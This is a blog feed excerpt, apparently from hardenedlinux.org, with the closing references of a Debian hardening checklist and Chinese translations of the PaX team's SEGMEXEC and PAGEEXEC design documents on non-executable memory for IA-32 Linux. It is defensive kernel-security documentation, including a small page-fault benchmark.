popular terms you might hear from your security consultant. But… due
to lack of engineering implementation, these crazy( &amp;amp; creepy?)
security standards are not our concerns here.&lt;/p&gt;

&lt;p&gt;—-[ 6.1 STIGs for Debian&lt;/p&gt;

&lt;p&gt;Once there’s history, there’s story about offense &amp;amp; defense. Once
we’ve heard fascinating stories from Mr.Sn0wden about how NSA fuck the
world, there should be some open information about how BIG-BROTHER do
the defense. &lt;a href=&quot;http://iase.disa.mil/stigs/Pages/index.aspx&quot;&gt;STIGs&lt;/a&gt; is one of them.&lt;/p&gt;

&lt;p&gt;I think I’m not the right person to write this section…..plz &lt;a href=&quot;http://hardenedlinux.org/jekyll/update/2015/06/19/STIG-4-Debian.html&quot;&gt;check this out&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;–[ 7. Reference&lt;/p&gt;

&lt;p&gt;[1] Back To The Future: Unix Wildcards Gone Wild
    http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt&lt;/p&gt;

&lt;p&gt;[2] SYNPROXY
    http://lwn.net/Articles/563151/&lt;/p&gt;

&lt;p&gt;[3] DDoS protection Using Netfilter/iptables
    http://people.netfilter.org/hawk/presentations/devconf2014/iptables-ddos-mitigation_JesperBrouer.pdf&lt;/p&gt;

&lt;p&gt;[4] INTERNET PROTOCOL
    http://tools.ietf.org/html/rfc791&lt;/p&gt;

&lt;p&gt;[5] A simple TCP spoofing attack
    http://www.citi.umich.edu/u/provos/papers/secnet-spoof.txt&lt;/p&gt;

&lt;p&gt;[6] ICMP Attacks Illustrated
    http://www.sans.org/reading-room/whitepapers/threats/icmp-attacks-illustrated-477&lt;/p&gt;

&lt;p&gt;[7] SUSE Linux Enterprise Server 11 SP3 - Security and Hardening
    https://www.suse.com/documentation/sles11/singlehtml/book_hardening/book_hardening.html&lt;/p&gt;

&lt;p&gt;[8] Securing Debian Manual 
    https://www.debian.org/doc/manuals/securing-debian-howto/&lt;/p&gt;

&lt;p&gt;[9] A Brief Introduction to auditd
    http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/&lt;/p&gt;

&lt;p&gt;[10] Apparmor RBAC
     http://wiki.apparmor.net/index.php/Pam_apparmor_example&lt;/p&gt;

&lt;p&gt;[11] Hardening PHP from php.ini
     http://www.madirish.net/199&lt;/p&gt;

&lt;p&gt;[12] CVE-2014-0196 exploit
http://bugfuzz.com/stuff/cve-2014-0196-md.c&lt;/p&gt;

&lt;p&gt;[13] Secure Secure Shell
https://stribika.github.io/2015/01/04/secure-secure-shell.html&lt;/p&gt;

&lt;p&gt;[14] STIGs
     http://iase.disa.mil/stigs/Pages/index.aspx
     http://iase.disa.mil/stigs/os/unix-linux/Pages/index.aspx&lt;/p&gt;
</description>
        <pubDate>Wed, 10 Jun 2015 06:48:45 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/06/10/debian-security-chklist.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/06/10/debian-security-chklist.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>SEGMEXEC设计文档</title>
        <description>&lt;h2 id=&quot;segmexechttppaxgrsecuritynetdocssegmexectxt&quot;&gt;原文：&lt;a href=&quot;http://pax.grsecurity.net/docs/segmexec.txt&quot;&gt;SEGMEXEC设计文档&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;作者：The PaX team&lt;/p&gt;

&lt;p&gt;译者：n3o4po11o&lt;/p&gt;

&lt;h3 id=&quot;section&quot;&gt;1. 设计&lt;/h3&gt;

&lt;p&gt;SEGMEXEC的目标是通过IA-32构架CPU的内存分段实现不可执行页(Non-executable Page).&lt;/p&gt;

&lt;p&gt;在IA-32环境下,Linux运行在保护模式下并开启了内存分页。这意味着，所有访问内存的操作都必须经过两步的地址转换。第一步从指令中解码出逻辑地址并将其转换为线性地址（也就是我们常说的虚拟地址）.这个转换通过内存分段来完成，具体细节在另外的文档进行描述。&lt;/p&gt;

&lt;p&gt;由于Linux高效地通过不使用分段而是通过分别为代码和数据的访问创建基址为0，段界限为4GB的内存段（因此，逻辑地址和线性地址一致），这使得通过设置段来实现不可执行页成为了可能。&lt;/p&gt;

&lt;p&gt;基本的思路是将3GB用户态的线性地址空间平均分成两半，其中一半用来放置数据的映射（那就是我们定义了一个可以涵盖0-1.5GB范围的线性地址的数据段描述符），而另外一半用来放置代码的映射（那就是我们定义了一个可以涵盖1.5-3GB范围的线性地址的代码段描述符）。由于一个可执行的映射也可以用来进行数据的存取。我们必须保证这样的映射对两个段都可见，在两个段中相对应的地址都有这些数据的映射。这样的设置会在取指令时将数据存取的操作分离开来。因此能够基于访问的类型进行控制或者干预。而当一个只会出现在0-1.5GB线性地址范围的数据，有了试图执行的行为，就会抛出页错误（page fault, PF）&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;2. 实现&lt;/h3&gt;

&lt;p&gt;SEGMEXEC的核心为虚拟内存空间镜像（vma mirroring），其具体细节在单独的&lt;a href=&quot;https://pax.grsecurity.net/docs/vmmirror.txt&quot;&gt;文件&lt;/a&gt;中进行讨论.可执行文件映射的镜像除了有RANDEXEC的情况下，是通过do_mmap()（位于include/linux/mm.h）来完成的。do_mmap()是用户态和内核态用来发起映射请求的函数。&lt;/p&gt;

&lt;p&gt;这样特殊的代码段描述符和数据段描述符放置在arch/i386/kernel/head.S中一个叫做gdt_table2的新全局描述符表(Global Descriptor Table)中。另外的全局描述表存在有两个原因：第一是为了简化实现，这样的话用户态的CS/SS选择器就不需要有任何改变；第二是能够防止在单独一个全局描述表中简单的通过滥用retf或者其他指令打破SEGMEXEC中受限制的代码段的攻击。而GDT保存的用户态的代码/数据描述符与SEGMEXEC事务中的不一致。我们必须对/arch/i386/kernel/process.c中对底层内容进行转换代码的__switch_to()函数以及在fs/bin/fmt_elf.c(其在用户态中对可执行文件的执行进行初始准备)中的local_elf_binary()函数的最后一步进行修改。&lt;/p&gt;

&lt;p&gt;全局描述符表拥有在运行时进行设置的高级电源管理特定的描述符，而这些描述符也必须传递给第二个全局描述符表（通过arch/i386/kernel/apm.c）。最后，原有的全局描述符表必须将储存的每个CPU任务状态描述符(TSS)与本地描述符表描述符与第二个全局描述符表进行同步。（通过arch/i386/kernel/traps.c中的set_tss_desc()与set_ldt_desc()函数来完成）&lt;/p&gt;

&lt;p&gt;由于内核允许用户态在本地描述符表中自己定义代码段描述符，我们必须将这个功能
禁止，防止用来打破激活SEGMEXEC下代码段的限制。（通过arch/i386/kernel/ldt.c中
的write_ldt()进行额外的检查）&lt;/p&gt;
</description>
        <pubDate>Tue, 26 May 2015 13:05:05 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/05/26/segmexec.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/05/26/segmexec.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>PAGEEXEC的最早设计文档</title>
        <description>&lt;p&gt;Shawn：事实证明对性能影响很大，在之后的一些年里SEGEXEC用的更多，但
PAGEXEC让我们明白了初始的PaX feature到底是什么样的一个东东，不了解你
hacking领域历史的人永远无法去解决未来所要面对的问题，过去的15年里系统安
全经历了有趣的进化，关于进攻阵营介绍已经够多了（或许我们未来可以花些时
间聊聊），Aleph One也是名利双收。&lt;/p&gt;

&lt;p&gt;在防御的这一方，虽然PaX/Grsecurity对整个内核安全造成了巨大影响和冲击，
但The PaX team和Spender并未从中赚取哪怕1美分，而PAGEEXEC是
PaX/Grsecurity的alpha，我们不知道哪个feature会成为omega，但至少我们可以
借助PaX team的这篇文档对那个0ld g00d h4ck1ng days的年代有一些回顾。&lt;/p&gt;

&lt;h2 id=&quot;pageexechttpspaxgrsecuritynetdocspageexecoldtxt&quot;&gt;原文：&lt;a href=&quot;https://pax.grsecurity.net/docs/pageexec.old.txt&quot;&gt;PAGEEXEC的最早设计文档&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;作者：The PaX team&lt;/p&gt;

&lt;p&gt;译者：Shawn the R0ck&lt;/p&gt;

&lt;h3 id=&quot;abstract&quot;&gt;0. abstract&lt;/h3&gt;

&lt;p&gt;这篇文档讨论在IA-32处理器上实现不可执行（比如用户态代码所在的页只有读和
写的权限，但没有执行的权限）。因为处理器的原生页表和页目录不提供这样的
功能，所以这个实现有一定的难度。&lt;/p&gt;

&lt;p&gt;这个设计的想法是源于Kevin Lawton, Ramon van Handler和其他为plex86项目贡
献的人（看footnote 1）。&lt;/p&gt;

&lt;h3 id=&quot;intro&quot;&gt;1. intro&lt;/h3&gt;

&lt;p&gt;联网计算机的安全是最近每天都在讨论的议题。很多安全问题都是归结于一种基
于缓冲区利用的特的攻击技术，这类攻击都依赖于应用程序内部不恰当的数据处
理（看footnote 2）。&lt;/p&gt;

&lt;p&gt;大部分的攻击都是程序错误的数据处理导致执行攻击者的代码（就如程序自己执
行一样），这个影响允许攻击者去执行任何的操作而应用程序也会允许攻击者的
代码这么干。&lt;/p&gt;

&lt;p&gt;这是一个非常糟糕的事情，必须得想法修复掉。最直观的解决这个问题的方法当
然是修复现有的漏洞和保证新的代码在设计和实现时的质量（完美程序员模式）。&lt;/p&gt;

&lt;p&gt;但是人类总是会犯错，现在已经有几种对抗缓冲区溢出的方法，其中的一个就是
不可执行的页，这也是能根除原本应该是数据的页但用于执行的可能性（在一个
典型的缓冲区溢出的场景是数组保存在栈上）。&lt;/p&gt;

&lt;p&gt;有一些处理器支持给页标注为只能执行（vs. 数据读/写），但不幸的是IA-32类
的CPU不支持（Intel, Amd, etc)。&lt;/p&gt;

&lt;h3 id=&quot;the-idea&quot;&gt;2. the idea&lt;/h3&gt;

&lt;p&gt;1999年7月，plex86(后来的freemware)项目在一些来自互联网用户的帮助下开始
了针对IA-32处理器的一个特性（一些人认为是一个bug，尽管后来成为了拯救者）
进行了测试。&lt;/p&gt;

&lt;p&gt;这个特性依赖于Pentium处理器和更新的处理器的TLB（translation lookaside
buffer)是区分数据TLB（DTLB）和指令TLB（ITLB）的。TLBs作为PTEs(page
table entries，页表条目)的缓存，因此保存着user/supervisor(用户和管理员）
受访问的权限。通常情况下ITLB和DTLB条目（对于特定的线性/物理地址对）是加
载于同样的PTE，因此他们包含了一致的状态。&lt;/p&gt;

&lt;p&gt;plex86社区想要测试是否能让DTLB和ITLB的条目产生不一样的状态。他们当时有
兴趣看看在一个只允许代码执行的页上去做数据读写造成的页错误( page
fault, PF），因为允许类似自修改代码的检测对于虚拟化来说是重要的特性。&lt;/p&gt;

&lt;p&gt;然后这个机制可以导致另一种不一致的状态，即只允许读和写，而代码执行是被
禁止的；这正是对抗基于缓冲区溢出所需要的。&lt;/p&gt;

&lt;p&gt;他们的测试被证实是成功的（看footnote 3)&lt;/p&gt;

&lt;h3 id=&quot;the-theory&quot;&gt;3. the theory&lt;/h3&gt;

&lt;p&gt;PTE和TLB管理是内核内存管理子系统的功能，因此实现不可执行的页必须是改动
内核本身，这个章节我们将会描述在实现过程中哪些地方需要处理，之后会谈谈
在Windows NT/2000和Linux内核里的实现，因为Windows的源代码和底层系统相关
的一些文档并不能以公开的渠道获取，我们将会涉足一些逆向工程（希望微软会
把这个安全机制在未来的NT系统中加入）。&lt;/p&gt;

&lt;p&gt;一个不可执行的页需要在TLB里创建和维护一组特殊的状态，这些状态信息用于表
示对于特定的页的TLB信息，看下图：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                          ITLB

                           - | S | U
                          -----------
                 D     - | 0 | 1 | 2 |
                 T        -----------
                 L     S | 3 | 4 | 5 |
                 B        -----------
                       U | 6 | 7 | 8 |
                          -----------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;TLB要么没有任何对应线性/物理地址对( - )的条目，要么有一个条目指向用户
（U）或者管理员（S）的访问权限。&lt;/p&gt;

&lt;p&gt;注意，通常情况下状态5和7从来不会发生（他们都是不一致的状态）。&lt;/p&gt;

&lt;p&gt;任何页的初始状态都是0，当处理器访问了页（指令fetch或者数据读写操作），
状态就开始有所变化。一般的可能的状态转换如下面所示：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    0 -&amp;gt; 1 (ITLB fill, PTE specifies Supervisor rights)
    0 -&amp;gt; 2 (ITLB fill, PTE specifies User rights)
    3 -&amp;gt; 4 (ITLB fill, PTE specifies Supervisor rights)
    3 -&amp;gt; 5 (ITLB fill, PTE specifies User rights)      
    6 -&amp;gt; 7 (ITLB fill, PTE specifies Supervisor rights)
    6 -&amp;gt; 8 (ITLB fill, PTE specifies User rights)      

    0 -&amp;gt; 3 (DTLB fill, PTE specifies Supervisor rights)
    0 -&amp;gt; 6 (DTLB fill, PTE specifies User rights)      
    1 -&amp;gt; 4 (DTLB fill, PTE specifies Supervisor rights)
    1 -&amp;gt; 7 (DTLB fill, PTE specifies User rights)      
    2 -&amp;gt; 5 (DTLB fill, PTE specifies Supervisor rights)
    2 -&amp;gt; 8 (DTLB fill, PTE specifies User rights) 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;另外一半可能的状态转换刚好和上面的状态转换方向相反（用于表示冲刷到期的
TLB条目）以及下面两个：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    4 -&amp;gt; 0 (显式调用TLB flush指令)
    8 -&amp;gt; 0 (显式调用TLB flush指令)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;读到这里，仔细的读者可能已经发现没有在S和U状态之间的直接转换。因为在这
里我们不讨论直接通过MSRs的方式操作TLB页表的方式。如果内核直接操作TLB条
目，那么额外的状态转换必须考虑。&lt;/p&gt;

&lt;p&gt;有了以上的信息，我们可以定义什么“好”和“坏”的状态以及状态转换了，之后可
以决定怎么进入和维护仅仅是“好”的状态。&lt;/p&gt;

&lt;p&gt;不违反在一个页上“不可执行”的特性时被称为“好”状态，“好”状态如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    0,3,6: 由于没有ITLB条目所以无法取指令，所以没有代码可以在这种页
           上执行

    1,4,7: 用户态代码（一个执行线程的CPL（当前权限）为3）可以在这些
           页上导致一个页错误，所以内核可以做相应的动作
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注意，初始状态（0）是一个“好”状态，我们仅会去保证不会有转换到“坏”状态。&lt;/p&gt;

&lt;p&gt;一个好的状态转换是转换到一个”好“状态（坏的状态转换是导致最终转换到了”坏
“状态），我们的目标是维护一个”好“状态，因此我们想当”坏“状态转换发生时收
到通知（然后去阻止它）。但并没有办法通过一个TLB条目的冲刷收到通知（过期
冲刷或者显式调用），我们从现在开始不应该考虑这个问题（除了5 -&amp;gt; 2和8 -&amp;gt;
2，这2个状态初始时就已经是“坏”状态了“，这种情况尽量在设计时考虑不要让它
们发生，请看关于paranoid security的footnote）。&lt;/p&gt;

&lt;p&gt;“好”的状态转换如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    0 -&amp;gt; 1
    3 -&amp;gt; 4
    6 -&amp;gt; 7
    0 -&amp;gt; 3
    0 -&amp;gt; 6
    1 -&amp;gt; 4
    1 -&amp;gt; 7
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;“坏”的状态转换如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    0 -&amp;gt; 2
    3 -&amp;gt; 5
    6 -&amp;gt; 8
    2 -&amp;gt; 5
    2 -&amp;gt; 8
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注意，最后2个“坏”状态转换的初始状态就是“坏”的（这种情况在我们的设计里要
避免）。如何对待它们取决于我们对安全有多被害妄想症结（我们有多信任我们
的实现，内核完整性等问题）。在接下来的讨论中，我们不会把这2种状态转换纳
入考虑（因此也不会有针对的防御机制），我们仅会指出它们会影响设计和实现
的哪些方面。这些问题让我们本质上要做一个性能 vs. (被害妄想症)安全的决定。&lt;/p&gt;

&lt;p&gt;现在我们可以把注意力转移到如何检测在用户空间里“坏”状态转换的尝试上，如
果我们可以让转换时触发处理器中断的正常流程，那应该可以做到检测。达到这
个目的唯一的途径是在相应的转换时触发一个页错误，每个可能的”坏“状态转换
大致如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; 0 -&amp;gt; 2, 3 -&amp;gt; 5, 6 -&amp;gt; 8:

    - 一个PTE（页目录条目）的P( Present)位不设置（PTE.NP）。当任何
      代码导致ITLB从这个PTE读取时，我们能获得一个页错误。

    - 一个PTE的U/S（User/Supervisor）位设置到S（PTE.S）。当用户态代
      码导致ITLB从这个PTE读取时，我们能获取到一个页错误。

 2 -&amp;gt; 5, 2 -&amp;gt; 8:

    - 一个PTE（页目录条目）的P( Present)位不设置（PTE.NP）。当任何
      代码导致ITLB从这个PTE读取时，我们能获得一个页错误。
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;不论我们如何选择，我们都必须先了解对于不同方式实现”好“状态转换的不同影
响：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; - PTE.NP方式的状态转换会导致正常情况下不会造成的额外页错误

 - PTE.S会消除掉一些转换，也会造成额外的页错误
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下面这个表描述了当被内核态和用户态代码触发时上述选择可以造成的“好”转换：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; trans | choice: PTE.NP          PTE.S
 ition | mode:   S     U         S     U
 -------------------------------------------------------------------
 0 -&amp;gt; 1:         PF    PF        none  PF (transformed from 0 -&amp;gt; 2)
 3 -&amp;gt; 4:         PF    PF        none  PF (transformed from 3 -&amp;gt; 5)
 6 -&amp;gt; 7:         PF    PF        none  PF (transformed from 6 -&amp;gt; 8)
 0 -&amp;gt; 3:         PF    PF        none  PF
 0 -&amp;gt; 6:         PF    PF        n/a   n/a (transformed into 0 -&amp;gt; 3)
 1 -&amp;gt; 4:         PF    n/a       none  n/a
 1 -&amp;gt; 7:         PF    n/a       none  n/a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从这里我们可以看出的确得在性能与安全之间做出决定，如果我们继续选择被害
妄想症模式，唯一的选择就是PTE.NP，不幸的是这个模式产生更多的页错误会对
系统的性能有很大的影响，还必须对现有的内核页管理系统进行大规模修改，特
别是针对基于页文件（swap）的虚拟内存管理的部分，而U/S位通常没有太大性能
影响。&lt;/p&gt;

&lt;p&gt;总结一下这个章节，陈述一个不可执行的页必须实现哪些部分：&lt;/p&gt;

&lt;h3 id=&quot;usspte&quot;&gt;3.1. 创建U/S位为S的PTE页。&lt;/h3&gt;

&lt;h3 id=&quot;ptepteuss&quot;&gt;3.2. 在PTE的生命周期里，保持PTE的U/S位始终设置为S。&lt;/h3&gt;

&lt;h3 id=&quot;section&quot;&gt;3.3. 扩展页错误处理到&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt; - 当“坏”转换发生时处理页错误（记得有些转换是被某些转换给重定向的）：


    0 -&amp;gt; 1:
    3 -&amp;gt; 4:
    6 -&amp;gt; 7:

           终止尝试在被标为不可执行的页上执行代码的用户线程，具体的
           操作可以更细粒度的给人类用户或者其他程序选择的提示，当然
           不排除有人乐意在繁忙的web服务器上点击yes/no按钮... ;-)


  - 当“好”转换发生时处理页错误：

    0 -&amp;gt; 3:
            
	正常数据访问页时从状态转换0 -&amp;gt; 6（栈操作，堆访问等）重
	定向过来的，这必须得保证处理的速度足够快：

            - 为这个页冲刷TLBs（x86指令：invlpg）
            - 从PTE.S改变为PTE.U
            - 访问页，以用户权限加载DTLB
            - 把PTE.U变回PTE.S（按照3.2的要求）
	- 恢复用户线程
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;得区分不同的原因导致的页错误，处理程序必须判断错误代码（去判断是否是
PTE.S或者其他原因导致的页错误）然后对比错误地址（寄存器CR2）和导致错误
的指令地址（存储在栈上的EIP），然后判断是否一致（“坏”转换尝试）或者不一
致。&lt;/p&gt;

&lt;p&gt;最后一个需要讨论的问题是关于多CPU环境。幸运的是，并没有太多需要担心的。
只有一种情况多CPU可能是个问题，就是当页错误处理程序尝试以用户权限加载
DTLB的同一时间段里违反了3.2，如果PTEs是在多CPU间共享的话，我们必须阻止
其他CPU加载ITLB，这里也有关于带来的性能问题考量：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    - 对于正在处理错误的CPU我们可以切换到一个新的私有页目录和修改或
      者使用一个私有的PTE拷贝。这个方法会冲刷整个TLBs（劣势），虽然为全局页
      保持了条目，但并不需要在CPU间进行任何同步操作（优势）。

    - 拖延其他CPU的执行，修改或者使用共享的PTE。这个方法除了对于刻
      意操作的DTLB条目外不影响TLBs（优势），但需要CPU间的同步操作
      （劣势）。

    - 不拖延其他CPU去修改或者使用共享的PTE。这种方法除了对于可以操
      作的DTLB条目外不影响TLBs（优势），也不要求CPU间进行同步（优
      势），但留了很小的时间窗口可能让PTE加载到不应该加载的处理器的
      ITLB里（劣势）。
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;linux-implementation&quot;&gt;4. Linux implementation&lt;/h3&gt;

&lt;p&gt;虚拟内存管理系统的核心数据结构vm_area_struct在include/linux/mm.h里声明
的，这个数据结构描述了一个任务的连续（在线性地址空间）页共享的相同的属
性（可读，可写，可执行，共享/私有，etc）。我们对两个字段有兴趣：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   vm_flags:
   决定了页能做的事情范围的flags（读/写/执行），修改后对于当前
   任务是否保持私有拷贝（COW激活），或者与其他任务共享到相同的
   范围（共享内存），有一些flags对于我们的讨论并不重要（看
   footnote 4）

   vm_page_prot:
   这些flags是在物理内存被分配到给定的内存范围时实际放进PTE的
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从vm_flags到vm_page_prot的转换是被一个被称为protection_map[]的简单数组
描述，定义在mm/mmap.c文件里。这是与硬件架构无关的分页子系统，但实际的符
号是使用来自特定架构的包含文件，IA-32是在include/asm-i386/pgtable.h。&lt;/p&gt;

&lt;p&gt;在我们的实现里，我们有意打破现有的代码风格去重命名一些常量（有时是增
加），所以程序员在未来应该显式的声明是否他们需要可执行的内存。&lt;/p&gt;

&lt;p&gt;下一步是去扩展页错误处理程序，首先是特定架构本身，对于IA-32是存放在
arch/i386/mm/fault.c里的do_page_fault()。&lt;/p&gt;

&lt;p&gt;页错误可能因为不同的原因被触发，为了加速处理过程IA-32处理器放了一个特殊
格式的错误代码在栈上作为附加的异常处理程序的栈帧。页错误处理程序跟处理
器相关的部分根据错误代码和内存范围包含的错误地址的vm_flags来做出决定(当
然不是所有页错误都发生在映射的内存里，但我们暂时不考虑它们）。&lt;/p&gt;

&lt;p&gt;错误代码如下（也请查阅footnote 5）：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; 名字           可能性
 -------------------------------------------------------------------------
 原因           PTE不是present(PTE.NP)

                用户空间代码违反权限(PTE.S)

                尝试写入只读或者COW页(PTE.R)


 读或写尝试     错误的指令获取尝试R/W
 
 管理员或者     错误指令在用户模式执行(CPL=3)，或者在管理员模式(CPL=0)
 用户模式
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接下来我们得决定针对不同原因产生错误时处理程序的操作，之后得定义我们的
方案（PTE.S）怎么去修改他们，下面的表里包含了所有老的和新的处理程序：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; legend:

   vm_flags: flags in vm_flags (仅4个最低有效位)

   pte:      针对特定vm_flags的pte里的flags (仅3个最低有效位)

   err:      pte flags的可能错误代码 (仅3个最低有效位)

   action:   sigbus (np): signal task （访问非Present的页)
             sigbus (w):  signal task （尝试写只读的页）
             cow:         处理 copy-on-write
             emu:         模拟PTE.U以及允许访问
             emu/kill:    检查访问是否合法(emu)或者不合法(kill)


 vm_flags   原始pte错误动作         PaX的pte错误动作
 ------------------------------------------------------
 0000       000 xx0 sigbus (np)     000 xx0 sigbus (np)
 0001       101 x11 sigbus (w)      001 011 sigbus (w)
                                        111 sigbus (w)
                                        101 emu/kill
 0010       101 x11 cow             001 011 cow
                                        111 cow
                                        101 emu/kill
                                    011 111 emu
 0011       101 x11 cow             001 011 cow
                                        111 cow
                                        101 emu/kill
                                    011 111 emu

 0100       101 x11 sigbus (w)      101 011 sigbus (w)
 0101       101 x11 sigbus (w)      101 011 sigbus (w)
 0110       101 x11 cow             101 011 cow
 0111       101 x11 cow             101 011 cow

 1000       000 xx0 sigbus (np)     000 xx0 sigbus (np)
 1001       101 x11 sigbus (w)      001 011 sigbus (w)
                                        111 sigbus (w)
                                        101 emu/kill
 1010       111 cannot fault        011 101 emu/kill
                                        111 emu
 1011       111 cannot fault        011 101 emu/kill
                                        111 emu

 1100       101 x11 sigbus (w)      101 011 sigbus (w)
 1101       101 x11 sigbus (w)      101 011 sigbus (w)
 1110       111 cannot fault        111 cannot fault
 1111       111 cannot fault        111 cannot fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下面的表显示了相同的信息（为PaX），但对于程序员更适合的格式：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; vm_flags| err
         | 000 001 010 011 100 101 110 111
 ---------------------------------------------
 0000      sig     sig     sig     sig
 0001                  sig     e/k     sig
 0010                  cow     e/k     cow/emu
 0011                  cow     e/k     cow/emu

 0100                  sig
 0101                  sig
 0110                  cow
 0111                  cow

 1000      sig     sig     sig     sig
 1001                  sig     e/k     sig
 1010                          e/k     emu
 1011                          e/k     emu

 1100                  sig
 1101                  sig
 1110
 1111
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;现在我们创建了新的页错误处理程序，让我们多少讨论一下Linux内核相关的问题，
比如PaX的副作用。首先是当前的可执行的栈（也可以说是被滥用的…）就这样
被干掉了，我们的改动影响了信号处理（比如return-from-sig-handling代码被
放到了用户空间的栈）和trampolines(GCC扩展）。&lt;/p&gt;

&lt;p&gt;在当前的实现中我们决定只解决之前（可能会有更严重的问题）问题，处理
trampolines还是留给别人吧（在注重安全的环境中这种代码本来就不应该允许执
行）。&lt;/p&gt;

&lt;p&gt;幸运的是，这些放在用户模式栈的代码都是固定的长度/内容，因此我们所需要做
的只是检查代码pattern。一个需要注意的地方是：这些检测尝试去的内存可能在
页上而非错误的指令，我们用了一个小技巧在代码拷贝到用户态栈（读者被邀请
去做做数学）之前去改变对齐。&lt;/p&gt;

&lt;p&gt;考虑到还有正常的可执行栈的使用，内核可以分配一个（可执行）页然后映射到
每个任务的地址空间（“浪费”了4kb的内存）。&lt;/p&gt;

&lt;p&gt;第2个问题（不算针对Linux）是PaX的性能损耗，我们有坏消息和好消息。其中能
猜到的是，越大和越高效的TLB会产生越少的页错误。在标准的IA-32处理器上，
TLBs看起来拥有64到256个条目（看footnote 6），他们至少4-way associative
（Shawn：暂时翻译成4组相连，如果每组是8个条目那4组是32个条目），或者全
部关联。这个意思是针对在至少1个TLB条目上的不同的页最多访问256次后必须让
其过期（打开了一扇通向潜在页错误的未来之门）。下面一个简单的测试程序能
看出PaX的性能影响。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  #include &amp;lt;stdio.h&amp;gt;

  int main()
  {
    char* buf;
    int i,j;

    buf = (char*)malloc(4096*257);
    for (j=0; j&amp;lt;100000; j++) {
      for (i=0; i&amp;lt;257; i++) {
        buf[i*4096] = 'a';
      }
    }
    return (0);
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在标准的Linux内核2.2.14上和打了PaX补丁的2.2.17内核上的测试结果如下：&lt;/p&gt;

&lt;p&gt;6.20user 0.01system 0:06.21elapsed 100%CPU (0avgtext+0avgdata 0maxresident)k
   0inputs+0outputs (77major+266minor)pagefaults 0swaps&lt;/p&gt;

&lt;p&gt;6.15user 29.74system 0:35.89elapsed 99%CPU (0avgtext+0avgdata 0maxresident)k
   0inputs+0outputs (77major+266minor)pagefaults 0swaps&lt;/p&gt;

&lt;p&gt;意料之中，PaX内核的额外页错误处理导致了一些性能下降（没有免费午餐）。好
消息是在真实世界的测试中性能损耗通常小于5–8%…..&lt;/p&gt;

&lt;h3 id=&quot;windows-nt2000-implementation&quot;&gt;5. Windows NT/2000 implementation&lt;/h3&gt;

&lt;p&gt;不辛的是，由于缺乏时间/心情/etc，我们不打算为Windows实现，有兴趣的读者
可以联系Ice (white_ice@usa.net)或者fOSSiL &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#102;&amp;#111;&amp;#115;&amp;#115;&amp;#097;&amp;#104;&amp;#064;&amp;#117;&amp;#115;&amp;#097;&amp;#046;&amp;#110;&amp;#101;&amp;#116;&quot;&gt;&amp;#102;&amp;#111;&amp;#115;&amp;#115;&amp;#097;&amp;#104;&amp;#064;&amp;#117;&amp;#115;&amp;#097;&amp;#046;&amp;#110;&amp;#101;&amp;#116;&lt;/a&gt;去做一些逆向
工程，设计和实现的工作&lt;/p&gt;

&lt;p&gt;给那些打算单干的路标：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   - 逆向工程工具IDA (the Interactive DisAssembler,
     http://www.datarescue.com). the next source of information is
     the symbol files available at the Customer Support
     Diagnostics page
     (http://www.microsoft.com/WINDOWS2000/downloads/ Other
     Downloads section has the link)

   - the following symbols are probably worth a look:
       - _MmUserProtectionToMask1, _MmUserProtectionToMask2
       - @KiFlushSingleTb@8, @KeFlushSingleTb@20
       - @MiDetermineUserGlobalPteMask@4, @MiMakeProtectionMask@4
       - _MmProtectToPteMask, _MmProtectToValue

   - 实现应该在让内核模式驱动（KMD）在启动时加载，大概也必须做一些
     运行时的内核patching，这些工作难度不低（想想SMP的场景）

   - 注意PAE和PSE

   - 别信任你最喜欢的调试器，它仅能提供很少关于Windows NT/2000的分
     析子系统的信息。
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;final-words&quot;&gt;6. final words&lt;/h3&gt;

&lt;p&gt;(to protect the innocent, names have been changed ;-)&lt;/p&gt;

